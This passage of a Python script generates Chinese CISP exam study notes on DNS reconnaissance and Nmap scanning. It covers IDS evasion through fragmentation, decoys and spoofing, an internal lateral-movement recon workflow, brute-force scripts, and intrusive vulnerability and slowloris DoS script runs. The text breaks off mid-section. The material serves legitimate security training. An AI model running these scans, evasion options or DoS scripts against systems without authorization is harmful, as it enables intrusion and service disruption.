| 3 | DNS记录类型 | ★★★★★ | ★★ | A(IPv4), AAAA(IPv6), MX(邮件), NS(DNS), CNAME(别名) |
| 4 | DNS缓存投毒 | ★★★★ | ★★★ | 伪造DNS响应污染缓存 |
| 5 | DNSSEC | ★★★★ | ★★ | DNS安全扩展，数字签名验证 |
| 6 | DNS隧道 | ★★★★ | ★★★ | 利用DNS传输非DNS数据 |
| 7 | dig/nslookup | ★★★★ | ★★ | dig是主要DNS查询工具 |
| 8 | SOA记录 | ★★★ | ★★ | 管理员邮箱、DNS版本、刷新间隔 |
| 9 | SPF/DKIM/DMARC | ★★★ | ★★★ | 邮件安全三大协议 |
| 10 | DNS放大攻击 | ★★★ | ★★ | 利用小查询触发大响应进行DDoS |

### 💡 知识巧记口诀

> **"DNS记录记心头"** — A 地址、AAAA 长地址、MX 邮件、NS 域名服务器、CNAME 别名、TXT 文本、SOA 授权、PTR 反向、SRV 服务。记住：**"A六M信C别名，T文S授P反向R服务"**。

> **"区域传送防护三招"** — 限制IP（allow-transfer）、TSIG密钥认证、DNSSEC签名。记住：**"限IP、加密钥、上签名"**。

> **"邮件安全三剑客"** — SPF（谁能发）、DKIM（是否篡改）、DMARC（怎么办）。记住：**"SPF定发件人，DKIM验完整性，DMARC定策略"**。

### 🎯 考试陷阱提醒

| 陷阱 | 正确理解 |
|:---|:---|
| "DNS查询使用TCP" | ❌ 错误！常规查询使用UDP 53，区域传送和长响应使用TCP 53 |
| "区域传送是正常功能" | ✅ 正确但需限制！AXFR是合法功能但必须限制源IP |
| "DNSSEC加密DNS通信" | ❌ 错误！DNSSEC提供完整性验证，不提供加密（DNS over HTTPS/TLS才加密） |
| "ANY查询总是返回所有记录" | ❌ 错误！许多DNS服务器已禁用ANY查询 |
| "dig和nslookup功能相同" | ❌ 不完全正确！dig功能更强大，输出更详细，更适合脚本处理 |

---

## 学习建议

1. 🔧 **精通 dig**：dig 是DNS信息收集的第一工具，掌握所有常用参数和输出格式
2. 📋 **建立DNS检查清单**：每次渗透测试前，系统性地检查所有DNS记录类型
3. 🔍 **练习区域传送检测**：在靶场环境中配置有漏洞的DNS服务器，练习AXFR攻击
4. 🛡️ **理解DNS安全机制**：深入学习DNSSEC、DNS over HTTPS/TLS的工作原理
5. 🌐 **建立DNS枚举流程**：证书透明度 → 搜索引擎 → 字典枚举 → 排列组合

---

> **DNS是互联网的"命脉"——掌握了DNS信息收集，你就掌握了目标网络的"地图"。在渗透测试中，永远从DNS开始，你会有意想不到的发现。**
""")

# ===================================================================
# Day 4：Nmap主机扫描
# ===================================================================
gen('day-4.md', """# Day 4：Nmap主机扫描

> **📘 文档定位**：CISP 考试核心基础 | 难度：入门 | 预计阅读：45 分钟
>
> Nmap（Network Mapper）是渗透测试领域最经典、最强大的网络扫描工具，没有之一。它被称为"扫描器之王"，能够完成主机发现、端口扫描、服务识别、操作系统检测、脚本扫描等一系列功能。掌握Nmap是一个渗透测试工程师的基本素养。

---

## 导航目录

- [一、Nmap概述与安装](#一nmap概述与安装)
- [二、主机发现技术](#二主机发现技术)
- [三、端口扫描技术详解](#三端口扫描技术详解)
- [四、服务版本与操作系统检测](#四服务版本与操作系统检测)
- [五、Nmap输出与报告](#五nmap输出与报告)
- [六、Nmap时间与性能优化](#六nmap时间与性能优化)
- [七、Nmap防火墙与IDS规避](#七nmap防火墙与ids规避)
- [八、Nmap实战场景演练](#八nmap实战场景演练)
- [九、Nmap与其他工具联动](#九nmap与其他工具联动)
- [十、高分考点与知识巧记](#十高分考点与知识巧记)

---

## 一、Nmap概述与安装

### 1.1 Nmap是什么

Nmap（Network Mapper）由Gordon Lyon（Fyodor）于1997年创建，是一款开源、跨平台的网络发现和安全审计工具。它使用原始IP数据包来探测网络上有哪些主机在线、主机提供什么服务、运行什么操作系统、使用什么类型的防火墙。

### 1.2 Nmap核心功能

| 功能 | 描述 | 典型参数 |
|:---|:---|:---|
| 主机发现 | 确定网络中有哪些活跃主机 | `-sn` (Ping扫描) |
| 端口扫描 | 确定主机上开放的TCP/UDP端口 | `-sS`, `-sT`, `-sU` |
| 服务版本检测 | 识别端口上运行的服务和版本 | `-sV` |
| 操作系统检测 | 猜测目标的操作系统类型 | `-O` |
| 脚本扫描 | 使用NSE脚本进行深度检测 | `-sC`, `--script` |
| 防火墙/IDS规避 | 各种规避防火墙的扫描技术 | `-f`, `-D`, `--data-length` |

### 1.3 Nmap安装

```bash
# Kali Linux（预装）
nmap --version

# Ubuntu/Debian
sudo apt install nmap -y

# CentOS/RHEL
sudo yum install nmap -y

# Windows
# 下载 https://nmap.org/download.html
# 或使用Windows包管理器
winget install Insecure.Nmap

# macOS
brew install nmap

# 源码编译
wget https://nmap.org/dist/nmap-7.94.tar.bz2
tar xjf nmap-7.94.tar.bz2
cd nmap-7.94
./configure && make && sudo make install
```

### 1.4 Nmap核心文件

```bash
# Nmap文件结构
nmap                    # 主程序
/usr/share/nmap/
├── nmap-services       # 端口-服务映射数据库
├── nmap-protocols      # IP协议号映射
├── nmap-rpc            # RPC服务映射
├── nmap-mac-prefixes   # MAC地址厂商映射
├── nmap-os-db          # OS指纹数据库
├── scripts/            # NSE脚本库（600+个脚本）
└── nselib/             # NSE库文件
```

> **🔑 高分考点**：Nmap是CISP考试中工具类最重要的考点。必须掌握`-sS`（SYN扫描）、`-sT`（TCP全连接扫描）、`-sU`（UDP扫描）、`-sV`（版本检测）、`-O`（OS检测）的区别和使用场景。

---

## 二、主机发现技术

### 2.1 主机发现概述

主机发现（Host Discovery/Ping Scan）是Nmap扫描的第一步，用于确定网络中有哪些主机在线：

```bash
# Ping扫描（仅主机发现，不扫描端口）
nmap -sn 192.168.1.0/24

# 输出示例：
# Nmap scan report for 192.168.1.1
# Host is up (0.0015s latency).
# Nmap scan report for 192.168.1.100
# Host is up (0.0023s latency).

# 使用列表文件
nmap -sn -iL targets.txt

# 排除特定主机
nmap -sn 192.168.1.0/24 --exclude 192.168.1.1,192.168.1.254
```

### 2.2 主机发现技术对比

| 选项 | 技术 | 原理 | 权限要求 | 穿透性 |
|:---|:---|:---|:---|:---|
| `-sn` | 默认（ICMP+TCP ACK+TCP SYN） | ICMP Echo + 80/443端口探测 | root | 中 |
| `-PE` | ICMP Echo Request | Ping请求/响应 | root | 低（常被过滤） |
| `-PP` | ICMP Timestamp Request | 时间戳请求 | root | 中 |
| `-PM` | ICMP Netmask Request | 地址掩码请求 | root | 中 |
| `-PS` | TCP SYN Ping | SYN包到指定端口 | root | 高 |
| `-PA` | TCP ACK Ping | ACK包到指定端口 | root | 高 |
| `-PU` | UDP Ping | UDP包到指定端口 | root | 中 |
| `-PR` | ARP Ping | ARP请求（局域网） | root | 最高（局域网） |

### 2.3 主机发现高级技巧

```bash
# TCP SYN Ping（最常用，穿透防火墙效果好）
nmap -PS80,443,22,3389 192.168.1.0/24
nmap -PS22-25,80,443,8080,8443 192.168.1.0/24

# TCP ACK Ping（绕过无状态防火墙）
nmap -PA80,443 192.168.1.0/24

# UDP Ping（探测UDP服务）
nmap -PU53,161,123 192.168.1.0/24

# ARP Ping（局域网最高效）
nmap -PR 192.168.1.0/24

# 组合多种探针（提高发现率）
nmap -PE -PS80,443 -PA80,443 -PU53 192.168.1.0/24

# 禁用主机发现（假设所有目标在线）
nmap -Pn 192.168.1.0/24    # 即使主机不响应ping也扫描

# 禁用DNS解析（提高扫描速度）
nmap -n -sn 192.168.1.0/24

# 显示发现过程
nmap -sn -v 192.168.1.0/24
nmap -sn --reason 192.168.1.0/24    # 显示判断依据
```

> **💡 知识巧记**：主机发现就像"敲门"——`-PE`是标准的"有人吗"，`-PS`是"80端口在吗"，`-PA`是"我确认你在"，`-PR`是"局域网里的直接呼唤"。

---

## 三、端口扫描技术详解

### 3.1 TCP端口扫描技术

Nmap提供了多种TCP端口扫描技术，各有特点和适用场景：

| 扫描类型 | 选项 | 原理 | 优缺点 |
|:---|:---|:---|:---|
| SYN半开扫描 | `-sS` | 发送SYN，收到SYN-ACK后发RST | 快速、隐蔽、不建立完整连接 |
| TCP全连接扫描 | `-sT` | 完整三次握手 | 准确、不需要root权限、会产生日志 |
| FIN扫描 | `-sF` | 发送FIN包 | 绕过部分防火墙 |
| NULL扫描 | `-sN` | 不设置任何标志位 | 绕过部分防火墙 |
| Xmas扫描 | `-sX` | 设置FIN/URG/PSH标志 | 绕过部分防火墙 |
| ACK扫描 | `-sA` | 发送ACK包 | 判断防火墙规则 |
| Window扫描 | `-sW` | 检查TCP窗口大小 | 某些系统窗口大小可区分 |
| Maimon扫描 | `-sM` | FIN/ACK扫描 | 少数系统响应不同 |

### 3.2 SYN扫描（最常用）

```bash
# SYN半开扫描 - 最流行的扫描方式
nmap -sS 192.168.1.100

# 完整交互过程：
# 攻击者 → 目标：SYN (端口80)
# 目标 → 攻击者：SYN-ACK (端口开放) 或 RST (端口关闭)
# 攻击者 → 目标：RST (不完成三次握手)

# 指定端口范围
nmap -sS -p 1-1000 192.168.1.100
nmap -sS -p 80,443,8080,8443 192.168.1.100
nmap -sS -p- 192.168.1.100             # 扫描全部65535个端口

# 快速扫描常见端口
nmap -sS -F 192.168.1.100              # 仅扫描前100个常见端口
nmap -sS --top-ports 1000 192.168.1.100 # 扫描前1000个常见端口
```

### 3.3 端口状态含义

| 状态 | 含义 | 响应情况 |
|:---|:---|:---|
| **open** | 端口开放，有服务监听 | 收到SYN-ACK响应 |
| **closed** | 端口关闭，无服务监听 | 收到RST响应 |
| **filtered** | 被防火墙/IDS过滤 | 无响应或收到ICMP错误 |
| **unfiltered** | 端口可达但无法判断 | ACK扫描收到RST |
| **open\|filtered** | 开放或被过滤 | UDP/FIN/NULL扫描无响应 |
| **closed\|filtered** | 关闭或被过滤 | IP ID扫描无法判断 |

> **🔑 高分考点**：`open`表示可连接，`closed`表示可达但无服务，`filtered`表示被防火墙阻挡，`open|filtered`是UDP扫描的典型结果。

### 3.4 UDP端口扫描

```bash
# UDP扫描（比TCP扫描慢得多）
nmap -sU 192.168.1.100
nmap -sU -p 53,67,68,69,123,161,500,514,520 192.168.1.100

# 结合TCP和UDP扫描
nmap -sS -sU -p T:22,80,443,U:53,161 192.168.1.100

# 加速UDP扫描
nmap -sU --min-rate 5000 -p 1-1000 192.168.1.100

# 常见UDP服务端口
# 53 (DNS), 67/68 (DHCP), 69 (TFTP), 123 (NTP)
# 161/162 (SNMP), 500 (IKE/IPsec), 514 (Syslog)
# 1900 (UPnP), 5353 (mDNS)
```

---

## 四、服务版本与操作系统检测

### 4.1 服务版本检测

```bash
# 服务版本检测
nmap -sV 192.168.1.100

# 版本检测强度级别
nmap -sV --version-intensity 0-9 192.168.1.100
# 0: 轻量级（仅使用默认探针）
# 9: 最全面（使用所有探针）
# 默认: 7

# 版本检测详细输出
nmap -sV --version-all 192.168.1.100    # 尝试所有探针
nmap -sV --version-trace 192.168.1.100  # 显示检测过程

# 常见识别结果示例
# 22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
# 80/tcp open  http    Apache httpd 2.4.6 ((CentOS))
# 3306/tcp open  mysql  MySQL 5.7.32
```

### 4.2 操作系统检测

```bash
# 操作系统检测（需要root权限）
nmap -O 192.168.1.100

# 详细OS检测
nmap -O --osscan-guess 192.168.1.100   # 猜测不确定的OS
nmap -O --osscan-limit 192.168.1.100   # 仅对有把握的目标检测
nmap -O --max-os-tries 1 192.168.1.100 # 限制尝试次数

# 常见检测结果示例：
# OS details: Linux 3.10 - 4.11
# OS details: Microsoft Windows Server 2012 R2
# OS details: Apple macOS 10.14 (Mojave)
```

### 4.3 综合扫描（推荐）

```bash
# 综合扫描 = 端口扫描 + 版本检测 + OS检测 + 默认脚本
nmap -sS -sV -O -sC 192.168.1.100

# 等价于
nmap -A 192.168.1.100

# 全面但耗时，包含：
# -sS: SYN扫描
# -sV: 服务版本检测
# -O: 操作系统检测
# -sC: 默认NSE脚本
# --traceroute: 路由追踪

# 分段综合扫描（更隐蔽）
# Step 1: 快速端口发现
nmap -sS -p- --min-rate 10000 192.168.1.100 -oN step1_ports.txt
# Step 2: 提取开放端口，精细扫描
ports=$(grep ^[0-9] step1_ports.txt | cut -d'/' -f1 | tr '\\n' ',')
nmap -sV -sC -O -p $ports 192.168.1.100 -oN step2_detail.txt
```

---

## 五、Nmap输出与报告

### 5.1 输出格式

```bash
# Nmap支持多种输出格式
nmap -oN scan_normal.txt 192.168.1.100     # 普通文本格式
nmap -oX scan_xml.xml 192.168.1.100        # XML格式（便于程序处理）
nmap -oG scan_grepable.txt 192.168.1.100   # Grepable格式（便于grep）
nmap -oA scan_all 192.168.1.100            # 同时输出三种格式
nmap -oS scan_script.txt 192.168.1.100     # Script Kiddie格式（好玩）

# 同时输出多种格式
nmap -oA full_scan -sS -sV -O 192.168.1.0/24
# 生成 full_scan.nmap, full_scan.xml, full_scan.gnmap

# 在终端显示的同时保存
nmap -sV 192.168.1.100 | tee scan.txt
```

### 5.2 XML输出处理

```python
#!/usr/bin/env python3
# 解析Nmap XML输出
import xml.etree.ElementTree as ET

def parse_nmap_xml(xml_file):
    tree = ET.parse(xml_file)
    root = tree.getroot()
    
    hosts_info = []
    for host in root.findall('host'):
        ip = host.find('address').get('addr')
        
        # 获取端口信息
        ports_info = []
        for port in host.findall('.//port'):
            port_id = port.get('portid')
            protocol = port.get('protocol')
            state = port.find('state').get('state')
            service = port.find('service')
            if service is not None:
                service_name = service.get('name', 'unknown')
                service_product = service.get('product', '')
                service_version = service.get('version', '')
            ports_info.append({{
                'port': port_id,
                'protocol': protocol,
                'state': state,
                'service': service_name,
                'product': service_product,
                'version': service_version
            }})
        
        hosts_info.append({{'ip': ip, 'ports': ports_info}})
    
    return hosts_info

# 生成报告
for host in parse_nmap_xml('scan.xml'):
    print(f"Host: {{host['ip']}}")
    for port in host['ports']:
        if port['state'] == 'open':
            print(f"  {{port['port']}}/{{port['protocol']}} - {{port['service']}} {{port['product']}} {{port['version']}}")
```

### 5.3 Grepable输出使用

```bash
# Grepable格式便于命令行快速处理
nmap -sS -oG - 192.168.1.100

# 提取开放端口
nmap -sS -oG - 192.168.1.100 | grep -oP '\\d+/open'

# 提取IP和开放端口
nmap -sS -oG - 192.168.1.0/24 | awk '/Up$/{{print $2}}'

# 提取所有开放80端口的主机
nmap -p80 --open -oG - 192.168.1.0/24 | grep "80/open" | awk '{{print $2}}'

# 生成主机列表
nmap -sn 192.168.1.0/24 -oG - | awk '/Up$/{{print $2}}' > live_hosts.txt
```

---

## 六、Nmap时间与性能优化

### 6.1 时序模板

```bash
# T0 (Paranoid): 极慢，用于IDS规避，每5分钟发一个包
nmap -T0 192.168.1.100

# T1 (Sneaky): 较慢，用于IDS规避，每15秒发一个包
nmap -T1 192.168.1.100

# T2 (Polite): 较慢，降低带宽占用
nmap -T2 192.168.1.100

# T3 (Normal): 默认速度
nmap -T3 192.168.1.100

# T4 (Aggressive): 快速扫描，假设网络良好
nmap -T4 192.168.1.100

# T5 (Insane): 极速扫描，假设网络极好
nmap -T5 192.168.1.100
```

### 6.2 精细时间控制

```bash
# 并行主机数
nmap --min-hostgroup 64 --max-hostgroup 256 192.168.1.0/24

# 并行探针数
nmap --min-parallelism 10 --max-parallelism 100 192.168.1.100

# 探针超时
nmap --min-rtt-timeout 100ms --max-rtt-timeout 500ms 192.168.1.100
nmap --initial-rtt-timeout 200ms 192.168.1.100

# 发包速率控制
nmap --min-rate 100 --max-rate 1000 192.168.1.100

# 扫描延迟（规避检测）
nmap --scan-delay 1s 192.168.1.100         # 每个探针间隔1秒
nmap --scan-delay 500ms 192.168.1.100      # 每个探针间隔500毫秒

# 重试次数
nmap --max-retries 1 192.168.1.100         # 最多重试1次

# 实际场景性能调优
# 内网高速扫描
nmap -T4 --min-rate 10000 -p- 192.168.1.100

# 外网隐蔽扫描
nmap -T2 --scan-delay 2s --max-retries 2 192.168.1.100

# 大量主机快速扫描
nmap -T4 -F --min-hostgroup 128 192.168.0.0/16
```

### 6.3 性能优化最佳实践

```bash
# 1. 使用主机发现缩小范围
nmap -sn 192.168.1.0/24 -oN live_hosts.txt

# 2. 仅扫描常见端口
nmap -sS --top-ports 100 -iL live_hosts.txt

# 3. 对重要主机深入扫描
nmap -sS -sV -O -sC -p- <critical_ip>

# 4. 使用Masscan进行大规模端口发现
masscan -p1-65535 --rate=10000 192.168.1.0/24 -oL masscan_output.txt
# 然后将Masscan结果导入Nmap做服务识别
```

---

## 七、Nmap防火墙与IDS规避

### 7.1 分片技术

```bash
# 将TCP头部分片，绕过简单包过滤
nmap -f 192.168.1.100                # 8字节分片
nmap --mtu 16 192.168.1.100          # 指定MTU大小
nmap --mtu 8 192.168.1.100           # 最小MTU
```

### 7.2 诱饵扫描

```bash
# 使用诱饵IP混淆目标
nmap -D RND:10 192.168.1.100         # 随机生成10个诱饵IP
nmap -D 192.168.1.5,192.168.1.6,ME 192.168.1.100  # 指定诱饵IP（ME代表真实IP）
```

### 7.3 源地址欺骗

```bash
# 伪造源IP（需要能收到响应）
nmap -S 192.168.1.50 192.168.1.100
nmap -e eth0 -S 192.168.1.50 192.168.1.100  # 指定网卡

# 源端口欺骗（伪装成DNS/DHCP流量）
nmap --source-port 53 192.168.1.100
nmap -g 53 192.168.1.100
```

### 7.4 其他规避技术

```bash
# 数据包填充
nmap --data-length 200 192.168.1.100   # 附加随机数据

# 随机化扫描顺序
nmap --randomize-hosts 192.168.1.0/24

# 伪造MAC地址
nmap --spoof-mac 00:11:22:33:44:55 192.168.1.100
nmap --spoof-mac Cisco 192.168.1.100   # 使用厂商前缀

# 禁用DNS解析（减少特征）
nmap -n 192.168.1.100

# 使用代理链
proxychains nmap -sT -Pn 192.168.1.100  # TCP全连接通过代理

# 坏校验和
nmap --badsum 192.168.1.100             # 测试IDS/IPS是否检测

# 综合规避配置
nmap -f -D RND:5 --data-length 50 --randomize-hosts -T2 -n 192.168.1.100
```

> **🔑 高分考点**：`-f`（分片）、`-D`（诱饵）、`--source-port`（源端口伪装）是最常用的三种规避技术。分片可以绕过不重组数据包的防火墙。

---

## 八、Nmap实战场景演练

### 8.1 外网渗透信息收集

```bash
# 场景：对目标公司进行外网渗透测试
# Step 1: 发现所有活跃主机
nmap -sn -n -T4 203.0.113.0/24 -oN step1_discovery.txt

# Step 2: 对所有活跃主机进行快速端口扫描
nmap -sS -T4 --top-ports 1000 -iL live_hosts.txt -oN step2_ports.txt

# Step 3: 对开放Web端口的主机进行深度扫描
nmap -sV -sC -p 80,443,8080,8443,9090 -iL live_hosts.txt -oN step3_web.txt

# Step 4: 对非Web服务进行服务识别
nmap -sV -sC -p 21,22,25,53,110,143,993,995,3306,3389,5432,6379,27017 -iL live_hosts.txt -oN step4_services.txt
```

### 8.2 内网横向移动前侦察

```bash
# 场景：已获得内网立足点，需要发现内网资产
# Step 1: 内网主机发现（快速）
nmap -sn -T4 10.0.0.0/24 10.0.1.0/24 172.16.0.0/24 -oN internal_discovery.txt

# Step 2: 扫描Windows常见端口
nmap -sS -T4 -p 135,139,445,3389,5985,5986 -iL internal_hosts.txt -oN windows_ports.txt

# Step 3: 扫描数据库服务
nmap -sS -T4 -p 1433,1521,3306,5432,6379,27017 -iL internal_hosts.txt -oN db_ports.txt

# Step 4: SMB脚本扫描
nmap -p 445 --script smb-os-discovery,smb-enum-shares -iL internal_hosts.txt -oN smb_enum.txt
```

### 8.3 Web应用侦察

```bash
# 场景：针对Web应用的专项扫描
# 基础Web扫描
nmap -sV -p 80,443 --script http-title,http-headers 192.168.1.100

# Web漏洞检测
nmap -p 80,443 --script http-sql-injection,http-stored-xss,http-csrf 192.168.1.100

# CMS识别
nmap -p 80,443 --script http-wordpress-*,http-joomla-*,http-drupal-* 192.168.1.100

# Web目录枚举
nmap -p 80,443 --script http-enum 192.168.1.100

# SSL/TLS安全分析
nmap -p 443 --script ssl-enum-ciphers,ssl-cert,ssl-heartbleed 192.168.1.100
```

---

## 九、Nmap与其他工具联动

### 9.1 Nmap + Metasploit

```bash
# Nmap扫描结果导入Metasploit
nmap -sV -oX scan.xml 192.168.1.0/24
msfconsole -q -x "db_import scan.xml; hosts; services"

# 在Metasploit中使用Nmap
msfconsole
msf6 > db_nmap -sV -O 192.168.1.100
msf6 > services -p 445
msf6 > vulns
```

### 9.2 Nmap + Masscan

```bash
# Masscan进行高速端口发现
masscan -p1-65535 --rate=10000 --open -oG masscan.gnmap 192.168.1.0/24

# 提取开放端口，Nmap精细扫描
awk '/Host/{{print $2, $4, $5, $6, $7}}' masscan.gnmap | while read ip port state; do
    nmap -sV -sC -p ${port##*/} $ip -oN nmap_${{ip}}_${{port##*/}}.txt
done
```

### 9.3 Nmap + Nikto

```bash
# Nmap发现Web服务后自动运行Nikto
for ip in $(nmap -p80,443 --open -oG - 192.168.1.0/24 | awk '/80\/open|443\/open/{{print $2}}'); do
    nikto -h $ip -o nikto_$ip.txt
done
```

---

## 十、高分考点与知识巧记

### 📌 高分考点速查表

| 序号 | 考点 | 考试频率 | 难度 | 关键答案 |
|:---:|:---|:---:|:---:|:---|
| 1 | SYN扫描原理 | ★★★★★ | ★★ | 半开扫描，不完成三次握手，发RST终止 |
| 2 | TCP全连接扫描 | ★★★★★ | ★ | 完成三次握手，产生日志 |
| 3 | 端口状态含义 | ★★★★★ | ★★ | open/closed/filtered/open\|filtered |
| 4 | -sV版本检测 | ★★★★ | ★ | 服务版本识别，强度0-9 |
| 5 | -O操作系统检测 | ★★★★ | ★★ | TCP/IP指纹匹配 |
| 6 | -A综合扫描 | ★★★★ | ★ | -sS -sV -O -sC --traceroute |
| 7 | -f分片规避 | ★★★★ | ★★ | 将TCP头分片绕过简单防火墙 |
| 8 | -D诱饵扫描 | ★★★ | ★★ | 使用诱饵IP隐藏真实扫描源 |
| 9 | 时序模板T0-T5 | ★★★ | ★ | T3默认，T4快速，T0/T1隐蔽 |
| 10 | NSE脚本引擎 | ★★★ | ★★★ | --script参数，600+脚本 |

### 💡 知识巧记口诀

> **"Nmap扫描三件套"** — `-sS`（SYN半开）、`-sV`（版本检测）、`-O`（系统检测）。记住：**"半开版本看系统"**。

> **"端口状态四兄弟"** — open（门开着）、closed（门关着）、filtered（有门禁）、open|filtered（UDP看不清）。记住：**"开关过滤看不清"**。

> **"规避三法宝"** — `-f`分片（把大包切小）、`-D`诱饵（真假难辨）、`--source-port`伪装（冒充DNS）。记住：**"切小包、放诱饵、装DNS"**。

### 🎯 考试陷阱提醒

| 陷阱 | 正确理解 |
|:---|:---|
| "Nmap只能用root运行" | ❌ 错误！非root用户可以运行-sT等不需要raw socket的扫描 |
| "SYN扫描不会产生日志" | ❌ 不准确！现代IDS/防火墙会记录SYN扫描 |
| "UDP扫描和TCP扫描一样快" | ❌ 错误！UDP扫描慢得多，因为需要等待超时 |
| "-O检测100%准确" | ❌ 错误！OS检测是基于指纹匹配的猜测，可能有误 |
| "-sV不需要开放端口" | ❌ 错误！版本检测需要先发现开放端口 |
| "-A是万能扫描" | ❌ 不准确！-A功能全面但特征明显，容易被检测 |

---

## 学习建议

1. 🔬 **搭建实验环境**：用 VirtualBox 创建 Kali + Metasploitable2 的隔离网络，大胆练习各种扫描参数
2. 📊 **用Wireshark抓包分析**：每次扫描都抓包观察，理解不同扫描类型的TCP交互差异
3. 📝 **建立Nmap命令清单**：整理常用的扫描组合，按场景分类，形成自己的"武器库"
4. 🛡️ **学习防火墙视角**：了解防火墙如何检测扫描行为，才能更好地规避检测
5. 🔗 **掌握工具联动**：Nmap + Masscan + Metasploit + Burp Suite 形成完整的渗透工具链

---

> **Nmap是渗透测试的"眼睛"——在动手攻击之前，你必须先看清楚目标的全貌。精通Nmap，你就掌握了网络侦察的核心能力。**
""")

print("\nDays 1-4 done, continuing with days 5-10...")

# ===================================================================
# Day 5：Nmap高级扫描
# ===================================================================
gen('day-5.md', """# Day 5：Nmap高级扫描

> **📘 文档定位**：CISP 考试核心基础 | 难度：中级 | 预计阅读：45 分钟
>
> Nmap不仅是一个端口扫描器，它更是一个强大的网络侦察平台。NSE（Nmap Scripting Engine）脚本引擎提供了600+个脚本，覆盖漏洞检测、暴力破解、信息收集、恶意软件检测等领域。掌握Nmap高级功能，能让你从"会用扫描器"升级为"网络侦察专家"。

---

## 导航目录

- [一、NSE脚本引擎架构](#一nse脚本引擎架构)
- [二、NSE脚本分类详解](#二nse脚本分类详解)
- [三、漏洞检测脚本实战](#三漏洞检测脚本实战)
- [四、暴力破解脚本实战](#四暴力破解脚本实战)
- [五、信息收集脚本实战](#五信息收集脚本实战)
- [六、自定义NSE脚本开发](#六自定义nse脚本开发)
- [七、Nmap Diff功能](#七nmap-diff功能)
- [八、Nmap与NDiff持续监控](#八nmap与ndiff持续监控)
- [九、Nmap高级扫描策略](#九nmap高级扫描策略)
- [十、高分考点与知识巧记](#十高分考点与知识巧记)

---

## 一、NSE脚本引擎架构

### 1.1 NSE概述

NSE（Nmap Scripting Engine）是Nmap最强大的功能之一。它使用Lua编程语言编写脚本，可以在扫描的不同阶段执行：

```
NSE脚本执行阶段：
┌──────────────┐
│  prerule()   │ ← 扫描前执行（如DHCP发现）
└──────┬───────┘
       ▼
┌──────────────┐
│  hostrule()  │ ← 每个主机执行一次
└──────┬───────┘
       ▼
┌──────────────┐
│  portrule()  │ ← 每个匹配的端口执行一次
└──────┬───────┘
       ▼
┌──────────────┐
│  action()    │ ← 核心扫描逻辑
└──────┬───────┘
       ▼
┌──────────────┐
│  postrule()  │ ← 扫描后执行（如汇总报告）
└──────────────┘
```

### 1.2 NSE脚本分类

| 分类 | 描述 | 典型脚本 |
|:---|:---|:---|
| auth | 认证绕过/检测 | http-default-accounts |
| broadcast | 广播发现 | broadcast-dns-service-discovery |
| brute | 暴力破解 | ssh-brute, ftp-brute |
| default | 默认脚本集(-sC) | http-title, ssl-cert |
| discovery | 网络发现 | snmp-info, dns-zone-transfer |
| dos | 拒绝服务测试 | http-slowloris |
| exploit | 漏洞利用 | http-shellshock, smb-vuln-ms17-010 |
| external | 依赖外部服务 | whois-domain, shodan-api |
| fuzzer | 模糊测试 | dns-fuzz, http-form-fuzzer |
| intrusive | 入侵性脚本 | http-sql-injection |
| malware | 恶意软件检测 | http-google-malware |
| safe | 安全脚本 | ssh-hostkey, ssl-enum-ciphers |
| version | 版本增强 | skypev2-version |
| vuln | 漏洞检测 | vulners, smb-vuln-ms17-010 |

> **🔑 高分考点**：`-sC` 等价于 `--script=default`，执行所有 default 分类的脚本。`--script=vuln` 执行所有漏洞检测脚本。`--script "safe or default"` 执行安全+默认脚本。

### 1.3 NSE脚本选择

```bash
# 脚本选择方式
nmap --script=ssh-auth-methods 192.168.1.100       # 单个脚本
nmap --script=http-title,http-headers 192.168.1.100 # 多个脚本
nmap --script=http-* 192.168.1.100                  # 通配符
nmap --script "not intrusive" 192.168.1.100         # 排除入侵性脚本
nmap --script "default or safe" 192.168.1.100       # 逻辑组合
nmap --script "http-* and not http-brute" 192.168.1.100 # 复杂组合
nmap --script=vuln 192.168.1.100                    # 按分类
nmap --script-help ssh-auth-methods                 # 查看脚本帮助
```

---

## 二、NSE脚本分类详解

### 2.1 查看可用脚本

```bash
# 查看所有脚本
ls /usr/share/nmap/scripts/ | wc -l        # 查看数量
ls /usr/share/nmap/scripts/*.nse | head -20 # 列出脚本

# 查看脚本信息
nmap --script-help ssh-brute.nse
nmap --script-help all | grep -i "samba"    # 搜索Samba相关

# 按分类查看
ls /usr/share/nmap/scripts/ | grep "^http-"
ls /usr/share/nmap/scripts/ | grep "^smb-"

# 脚本数据库更新
nmap --script-updatedb
```

### 2.2 脚本参数传递

```bash
# 传递脚本参数
nmap --script=http-brute --script-args 'userdb=users.txt,passdb=passwords.txt' 192.168.1.100

# 多个参数
nmap --script=http-sql-injection --script-args 'http-sql-injection.uri=/login.php?id=1' 192.168.1.100

# 使用文件传递参数
nmap --script=http-brute --script-args-file=args.txt 192.168.1.100

# 常见脚本参数
nmap -p 445 --script smb-vuln-ms17-010 --script-args unsafe=1 192.168.1.100
nmap -p 3306 --script mysql-brute --script-args userdb=root.txt 192.168.1.100
```

---

## 三、漏洞检测脚本实战

### 3.1 SMB漏洞检测

```bash
# MS17-010 (EternalBlue) 检测
nmap -p 445 --script smb-vuln-ms17-010 192.168.1.0/24
# 输出示例：
# | smb-vuln-ms17-010:
# |   VULNERABLE:
# |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (MS17-010)
# |     State: VULNERABLE

# SMB综合漏洞扫描
nmap -p 445 --script smb-vuln-* 192.168.1.100

# 具体SMB漏洞
nmap -p 445 --script smb-vuln-ms08-067 192.168.1.100   # Conficker
nmap -p 445 --script smb-vuln-ms10-054 192.168.1.100   # SMB溢出
nmap -p 445 --script smb-vuln-ms10-061 192.168.1.100   # 打印后台处理
nmap -p 445 --script smb-vuln-regsvc-dos 192.168.1.100 # 注册服务DOS

# SMB信息收集
nmap -p 445 --script smb-os-discovery 192.168.1.100    # OS信息
nmap -p 445 --script smb-enum-shares 192.168.1.100     # 共享枚举
nmap -p 445 --script smb-enum-users 192.168.1.100      # 用户枚举
nmap -p 445 --script smb-enum-domains 192.168.1.100    # 域信息
nmap -p 445 --script smb-protocols 192.168.1.100       # SMB协议版本
```

### 3.2 Web漏洞检测

```bash
# Shellshock (CVE-2014-6271)
nmap -p 80,443 --script http-shellshock --script-args uri=/cgi-bin/test.cgi 192.168.1.100

# Heartbleed (CVE-2014-0160)
nmap -p 443 --script ssl-heartbleed 192.168.1.100

# POODLE (CVE-2014-3566)
nmap -p 443 --script ssl-poodle 192.168.1.100

# DROWN (CVE-2016-0800)
nmap -p 443 --script ssl-drown 192.168.1.100

# HTTP慢速攻击检测
nmap -p 80 --script http-slowloris --script-args http-slowloris.runforever=true 192.168.1.100

